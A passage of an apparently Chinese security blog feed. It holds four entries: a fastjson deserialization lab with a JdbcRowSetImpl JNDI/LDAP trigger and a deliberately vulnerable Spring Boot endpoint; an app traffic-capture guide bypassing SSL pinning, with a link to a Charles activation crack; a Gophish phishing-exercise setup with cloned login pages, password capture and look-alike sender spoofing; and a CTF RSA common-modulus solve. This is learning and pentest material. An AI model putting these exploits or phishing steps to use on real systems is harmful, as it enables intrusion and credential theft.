<em>connect</em> 方法：</h6><p><em>connect</em> 方法先判断this.conn 是否为空，然后一眼就看到了两行很熟悉的代码 (jndi注入.md) ，其中调用了lookup方法解析了dataSource的值。</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305100017425.png" class="" title="image-20240305100017425"><p>创建一个小demo测试一下，直接利用 JdbcRowSetImpl 类来触发其中的 lookup 方法：</p><p>new一个 <em>JdbcRowSetImpl</em> 对象，调用其 <em>setDataSourceName</em> 和 <em>setAutoCommit</em> 方法，解析ldap地址</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://172.16.123.1:1389/vsrlgw&quot;</span>);<br>        jdbcRowSet.setAutoCommit(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305101750773.png" class="" title="image-20240305101750773"><h4 id="web演示："><a href="#web演示：" class="headerlink" title="web演示："></a>web演示：</h4><p>之前log4j是通过servlet进行演示的，这里利用springboot进行演示</p><h6 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h6><p>创建一个springboot项目：</p><p>更换一下服务器，换成阿里的，更换类型为maven，，更换java环境为java8，然后改个名即可</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305102302726.png" class="" title="image-20240305102302726"><p>添加一下所需要的组件，这里只添加spring web即可</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305102415990.png" class="" title="image-20240305102415990"><p>项目中 application.properties 为springboot的配置文件，可以修改端口，配置数据库连接等操作，这里将端口改为了8081，为避免与burp冲突</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305103033925.png" class="" title="image-20240305103033925"><p>项目中 FastJsonWebApplication 为启动文件，一般都是WebApplication为后缀</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305103127482.png" class="" title="image-20240305103127482"><p>访问端口，如下代表搭建成功</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305110149242.png" class="" title="image-20240305110149242"><p>在pom.xml中添加fastjson 1.2.24的依赖，然后刷新maven</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305111704201.png" class="" title="image-20240305111704201"><h6 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h6><p>创建一个控制器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305110327754.png" class="" title="image-20240305110327754"><p>敲代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjsonweb.controller;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-comment">//使用@RestController注解将其标记为Spring Boot控制器</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-comment">//使用@RequestMapping注解将该方法映射到请求的/fastjson路径</span><br><span class="hljs-meta">@RequestMapping(&quot;/fastjson&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjsonController</span> &#123;<br>    <span class="hljs-comment">//使用@GetMapping注解将该方法映射到GET请求的/hello路径</span><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello &quot;</span> + name;<br>    &#125;<br>    <br>    <span class="hljs-comment">//使用@PostMapping注解将该方法映射到POST请求的/vuln路径</span><br>    <span class="hljs-meta">@PostMapping(&quot;/vuln&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fastjson</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String code)</span>&#123;<br>        JSON.parseObject(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问 <code>http://localhost:8081/fastjson/hello</code> ，页面返回400，这是因为需要传递参数</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305140646671.png" class="" title="image-20240305140646671"><p>传递一个name参数，页面成功回显，证明没问题</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305142855013.png" class="" title="image-20240305142855013"><p>访问 <code>http://localhost:8081/fastjson/vuln</code>，页面返回405，方法错误，需要post访问</p><p>使用hackbar的post传参，参数为code，值为fastjson的payload，执行后成功弹出计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305143657101.png" class="" title="image-20240305143657101">]]></content>
    
    
    <categories>
      
      <category>漏洞浅析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastjson</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APP抓包</title>
    <link href="/2023/11/06/APP%E6%8A%93%E5%8C%85/"/>
    <url>/2023/11/06/APP%E6%8A%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>使用工具：夜神模拟器安卓5版本、xposed、Fiddle、BP</p><p>情况一：可以设置代理，但使用xposed时，安卓7不能正常访问百度，安卓5可以访问（怀疑app的数据也受到了影响）</p><p>工具作用：使用 Xposed + JustTruestMe 来突破SSL。一旦 app 校验了证书的指纹信息。我们的证书不再受信任了。自然而然就无法建立连接，所以必须想办法让 app 信任，才能继续抓包。</p><p>整体思路：模拟器安装xposed， JustTruestMe。设置代理转发到Fiddle，再转发到BP</p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><p>1、直接安装夜神模拟器自带的xposed</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106142509941.png" class="" title="image-20231106142509941"><p>2、安装</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106142804537.png" class="" title="image-20231106142804537"><p>3、允许</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106142931240.png" class="" title="image-20231106142931240"><p>4、等待重启（卡住的话手动重启）</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143018555.png" class="" title="image-20231106143018555"><p>5、安装完JustTruestMe后，找到xposed的模块，勾选上JustTruestMe</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143242298.png" class="" title="image-20231106143242298"><p>6、Fiddle配置。工具-&gt;选项-&gt;连接，如下配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143703331.png" class="" title="image-20231106143703331"><p>7、Fiddle配置。工具-&gt;选项-&gt;网关，如下配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106143823470.png" class="" title="image-20231106143823470"><p>8、配置模拟器代理，ip为物理机IP</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106145732311.png" class="" title="image-20231106145732311"><p>9、安装Fiddle证书。访问软件所在的物理IP和软件端口，点击下载安装</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106145148292.png" class="" title="image-20231106145148292"><p>10、打开BP，就可以抓包了，修改一下BP的端口为8081</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106150719726.png" class="" title="image-20231106150719726"><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>情况二：1、有的apk不能在安卓5上运行，只能在安卓7以上运行。2、设置代理抓不到包（不能完全解决此问题，有的软件还是不能正常访问所有功能点）</p><p>使用工具： 夜神模拟器安卓7版本，Postern + Charles + Burpsuite</p><p>工具作用：App 为了防止中间人抓包，特意设置了不走代理这个选项。通过 VPN 将所有流量转发到 Charles 的 socks 代理，再打开 Charles 的 External Proxy Server — （外部代理服务器）转发到 Burpsuite</p><p>整体思路：模拟器安装Postern。开启VPN转到 Charles，再转发到BP</p><h2 id="操作流程-1"><a href="#操作流程-1" class="headerlink" title="操作流程"></a>操作流程</h2><p>1、激活Charles地址：<a href="https://www.zzzmode.com/mytools/charles/%E3%80%82%E5%9C%A8%E8%BF%99%E4%B8%AA%E4%BD%8D%E7%BD%AE%E6%BF%80%E6%B4%BB%EF%BC%8C%E6%AD%A4%E5%9B%BE%E4%B8%BA%E6%BF%80%E6%B4%BB%E5%AE%8C%E7%9A%84">https://www.zzzmode.com/mytools/charles/。在这个位置激活，此图为激活完的</a></p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106152549650.png" class="" title="image-20231106152549650"><p>2、Windows proxy没有勾选，因为我不抓PC的数据</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106152915049.png" class="" title="image-20231106152915049"><p>3、点击proxy setting，如此配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106153109788.png" class="" title="image-20231106153109788"><p>4、配置模拟器代理，ip为物理机IP，端口为8888。浏览器访问<a href="http://chls.pro/ssl%EF%BC%8C%E5%B0%B1%E4%BC%9A%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6%EF%BC%8C">http://chls.pro/ssl，就会下载证书，</a></p><p>问题：因为打开了external proxy settings,所以下载不到证书，会报错。关掉。</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106155151403.png" class="" title="image-20231106155151403"><p>5、下载完证书后关掉代理。postern中如下配置，名称随便，IP为物理机IP，端口和代理类型和Charles相同</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106155853897.png" class="" title="image-20231106155853897"><p>6、postern中如下配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106160103635.png" class="" title="image-20231106160103635"><p>7、打开关闭VPN</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106160148061.png" class="" title="image-20231106160148061"><p>8、Charles数据转到BP配置</p><img src="/2023/11/06/APP%E6%8A%93%E5%8C%85/image-20231106160328654.png" class="" title="image-20231106160328654"><p>注：安装一个软件后，请多尝试。eg:A软件首次打开后，后打开代理就无法抓包。在首次打开软件的前打开代理，软件就可以抓包，这是为啥？？？</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://mp.weixin.qq.com/s/MKwYYjcHiiHNzT4RzRuBZg">微信公众平台 (qq.com)</a></p><p><a href="https://blog.csdn.net/holyxp/article/details/131768201">Postern + Charles + Burpsuite 进行对 APP 进行抓包_postern 抓包-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>APP抓包</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APP</tag>
      
      <tag>xposed</tag>
      
      <tag>Fiddle</tag>
      
      <tag>Postern</tag>
      
      <tag>Charles</tag>
      
      <tag>Burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gophish</title>
    <link href="/2023/07/13/Gophish/"/>
    <url>/2023/07/13/Gophish/</url>
    
    <content type="html"><![CDATA[<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>买了一个云服务器和两个域名</p><h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>使用Gophish钓鱼平台，使用腾讯的邮件推送服务作为邮件服务器</p><h2 id="腾讯邮件服务器的操作流程"><a href="#腾讯邮件服务器的操作流程" class="headerlink" title="腾讯邮件服务器的操作流程"></a>腾讯邮件服务器的操作流程</h2><p>1、登录腾讯邮件推送服务，点击立即开始</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%811.png" class="" title="腾讯邮件推送"><p>2、点击新建</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%812.png" class="" title="腾讯邮件推送"><p>3、选择买的域名</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%813.png" class="" title="腾讯邮件推送"><p>4、点击验证</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%814.png" class="" title="腾讯邮件推送"><p>5、验证按照此链接完成就行</p><p>参考链接：<a href="https://cloud.tencent.com/document/product/1288/60652">邮件推送 身份验证和配置相关问题-常见问题-文档中心-腾讯云 (tencent.com)</a></p><p>6、点击发信地址配置。点击新建创建发信人和密码（随意创建）</p>  <img src="/2023/07/13/Gophish/%E8%85%BE%E8%AE%AF%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%818.png" class="" title="腾讯邮件推送"><h2 id="gophish操作流程"><a href="#gophish操作流程" class="headerlink" title="gophish操作流程"></a>gophish操作流程</h2><p>1、首先对sending profiles进行配置，发送人和用户名要一样，密码为上图中的SMTP密码</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A81.png" class="" title="gophish使用"><p>2、第二步对邮件内容进行配置</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A82-1.png" class="" title="gophish使用"><p>邮件模板内容</p> <img src="/2023/07/13/Gophish/image-20230706103946286.png" class="" title="gophish使用"><p>在模板内容中，跳转的连接使用.URL作为变量，<code>.URL</code>是官方提供的参数，是gophish监听的钓鱼网页链接。</p> <img src="/2023/07/13/Gophish/image-20230706112532319.png" class="" title="gophish使用"><p>3、第三步加载钓鱼页面，如果要记录密码就要勾选上Passwords。Redirect to是钓鱼页面的跳转页面</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A83-1.png" class="" title="gophish使用"><p>下图为钓鱼页面样式</p> <img src="/2023/07/13/Gophish/image-20230706104153836.png" class="" title="gophish使用"><p>下图为钓鱼页面点击提交后跳转页面内容</p> <img src="/2023/07/13/Gophish/image-20230706104707269.png" class="" title="gophish使用"><p>4、然后批量加载收件人</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A84.png" class="" title="gophish使用"><p>5、最后发送，url为监听地址，这里的URL填写配置文档中对应的第二个地址。</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A85-1.png" class="" title="gophish使用"><h4 id="大概流程就是以上那些，下面是遇到问题"><a href="#大概流程就是以上那些，下面是遇到问题" class="headerlink" title="大概流程就是以上那些，下面是遇到问题"></a>大概流程就是以上那些，下面是遇到问题</h4><p>后面客户要求钓鱼页面使用他们公司内部的网站，然后我们尝试直接copy要钓鱼的页面。</p> <img src="/2023/07/13/Gophish/image-20230707145236063.png" class="" title="gophish使用"><p>在此次项目中，因为客户的页面在内网，钓鱼平台在外网，所以无法直接copy页面；直接copy页面的源代码出现没有样式，排版很乱等问题。</p><p>然后使用火狐插件 Save Page WE下载地址：<a href="https://addons.mozilla.org/zh-CN/firefox/addon/save-page-we/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search%E3%80%82">https://addons.mozilla.org/zh-CN/firefox/addon/save-page-we/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search。</a>  使用插件来copy页面，样式可以完美copy。但是又出现了新问题，input标签不能编辑，最后是class的问题，删除了对应的class。</p><p><strong>就以为一切都结束了，又出现了新的问题，加载图片的功能不能用了，无法记录谁打开过邮件。</strong></p><p>这里有一个小坑，如果在gophish的<code>config.json</code>中<code>phish_server</code>设置<code>use_tls</code>为<code>false</code>，即监听的钓鱼网页不启用https的，在某些邮件服务器打开邮件的时候，应该请求http，但是自动跳转的是https，并且有概率会请求失败，这就导致数据统计有一定的不准确性。参考链接：<a href="https://toutiao.io/posts/htszx7d/preview">https://toutiao.io/posts/htszx7d/preview</a></p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A86.png" class="" title="gophish使用"><p>所以在配置文件中把use_tls设置为true。</p> <img src="/2023/07/13/Gophish/gophish%E4%BD%BF%E7%94%A87.png" class="" title="gophish使用"><p>配置文件修改内容</p> <img src="/2023/07/13/Gophish/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230710090350.png" class="" title="gophish使用"><p><strong>做项目时出现的问题：</strong></p><p>邮件标题问题导致用户接收不到邮件，到底是为什么不太清楚</p><p>发送延迟问题，怀疑是用户组使用了中文或者平台问题</p><p>copy的客户网站页面，用户名和密码不能编辑，原因是对应的class，注释到就可以了</p><p>如果想要记录谁打开了邮件，就要使用https协议，问题会有两个：</p><p>​1.收到邮件打开后，点击链接跳转不过去。可能会被受害者那边的安全策略拦截掉。</p><p>​2.https没有证书，受害者点击链接能够跳转过去的话，也会给安全告警提示。·</p><h2 id="2024年7月17日更新"><a href="#2024年7月17日更新" class="headerlink" title="2024年7月17日更新"></a>2024年7月17日更新</h2><p>今年客户要求伪造发件人，例如客户域名为：gophish.com，</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">发件人理想状态：管理员&lt;<span class="hljs-symbol">admin@</span>gophish.com&gt;<br></code></pre></td></tr></table></figure><p>但是由于SPF限制</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">实际伪造的发件人：管理员&lt;<span class="hljs-symbol">admin@</span>gophihs.com&gt;<br></code></pre></td></tr></table></figure><p>去年用的腾讯邮件服务区，但是买什么域名就只能用什么域名伪造，有局限性。所以今年自己搭建了一个邮件服务器</p><p>sendmail服务用apt安装的，用的外网服务器所以25端口能用。</p><p>gophish需要修改的地方</p><p><img src="/img/gofish/image-20240717170101528.png" alt="image-20240717170101528"></p><p>要保证Email Templates和Sending Profiles红框里这两个地方一样，要不然邮件会显示代发。其他的应该跟以前一样忘了哈哈哈哈哈哈</p><p><img src="/img/gofish/image-20240717171503205.png" alt="image-20240717171503205"></p><p><strong>参考链接：</strong></p><p><a href="https://xz.aliyun.com/t/11898#toc-0">企业级钓鱼演练平台搭建 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/540029594">宸极实验室——『工具使用』钓鱼平台 Gophish - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>实践经历</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钓鱼</tag>
      
      <tag>GoPhish</tag>
      
      <tag>腾讯邮件推送服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>共模攻击</title>
    <link href="/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    <url>/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="原题文件中存在两个文件message-txt和task-py"><a href="#原题文件中存在两个文件message-txt和task-py" class="headerlink" title="原题文件中存在两个文件message.txt和task.py"></a>原题文件中存在两个文件message.txt和task.py</h2><ul><li>message.txt文件</li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span><br>c1=<span class="hljs-number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span><br>c2=<span class="hljs-number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span><br></code></pre></td></tr></table></figure><ul><li>task.py文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>flag = f.read()<br>f.close()<br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e1 = <span class="hljs-number">65536</span><br>e2 = <span class="hljs-number">270270</span><br>c1 = <span class="hljs-built_in">pow</span>(m, e1, n)<br>c2 = <span class="hljs-built_in">pow</span>(m, e2, n)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;message.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;n=&#x27;</span> + <span class="hljs-built_in">str</span>(n) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;c1=&#x27;</span> + <span class="hljs-built_in">str</span>(c1) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;c2=&#x27;</span> + <span class="hljs-built_in">str</span>(c2) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.close()<br></code></pre></td></tr></table></figure><h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span><br>e1=<span class="hljs-number">65536</span><br>e2= <span class="hljs-number">270270</span><br>c1=<span class="hljs-number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span><br>c2=<span class="hljs-number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span><br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br>s,s1,s2=gmpy2.gcdext(e1,e2)   <span class="hljs-comment">#e1*s1+e2*s2=2</span><br><span class="hljs-built_in">print</span>(s,s1,s2)  <span class="hljs-comment">#此时s=2，最大公约数</span><br>m1=(<span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n))%n  <span class="hljs-comment">#扩展欧几里得算法</span><br>m,t=gmpy2.iroot(m1,<span class="hljs-number">2</span>)   <span class="hljs-comment">#[0]是m的值，[1]是t的值true还是false</span><br><span class="hljs-keyword">if</span> t:<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><h2 id="共模攻击的原理"><a href="#共模攻击的原理" class="headerlink" title="共模攻击的原理"></a>共模攻击的原理</h2>  <img src="/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB-1.png" class="" title="原理">  <img src="/2023/05/05/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB-2.png" class="" title="原理"><ul><li>上面解题代码中m1&#x3D;(pow(c1,s1,n)<em>pow(c2,s2,n))%n与数学中（c1^s1</em>c2^s2）%n这个式子是同一个，下面证明这个式子能够化简出明文。（“%”是取余数）<ul><li>将c1，c2带入到上面的式子（c1^s1<em>c2^s2）%n里，进行一系列数论中的模运算，有：<br>（c1^s1</em>c2^s2）%n&#x3D;（（m^e1%n）^s1*（m^e2%n）^s2）%n</li><li>根据模运算的性质（a<em>b）%p&#x3D;（a%p</em>b%p）%p得：<br>（（m^e1%n）^s1<em>（m^e2%n）^s2）%n&#x3D;（（（m^e1%n）^s1）%n</em>（（m^e2%n）^s2）%n）%p</li><li>根据模运算的性质（（a%p）^b）%p&#x3D;a^b%p得：<br>（（（m^e1%n）^s1）%n<em>（（m^e2%n）^s2）%n）%p&#x3D;（（（m^e1）^s1%n）</em>（（m^e2）^s2%n））%p</li><li>根据模运算的性质（a%p<em>b%p）%p&#x3D;（a</em>b）%p得：<br>（（（m^e1）^s1%n）<em>（（m^e2）^s2%n））%p&#x3D;（（m^e1）^s1</em>（m^e2）^s2）%p</li><li>由幂的乘方，底数不变，指数相乘可得：<br>（m^（e1<em>s1）</em>m^（e2*s2））%p</li><li>由同底数幂相乘，底数不变，指数相加可得：<br>（m^（e1<em>s1+e2</em>s2））%n</li><li>因为e1<em>s1+e2</em>s2&#x3D;1，所以（c1^s1<em>c2^s2）%n&#x3D;（m^1）%n,因为m小于n,所以（c1^s1</em>c2^s2）%n&#x3D;m。</li></ul></li></ul><p>共模攻击，正常情况下e1和e2是互素的最大公约数应该是1<br>而现在的e1和e2分别为65536，270270他们最大公约数是2，可得（e1<em>s1+e2</em>s2）&#x3D;2，<br>就有（c1^s1<em>c2^s2）%n&#x3D;（m^2）%n—&gt;（c1^s1</e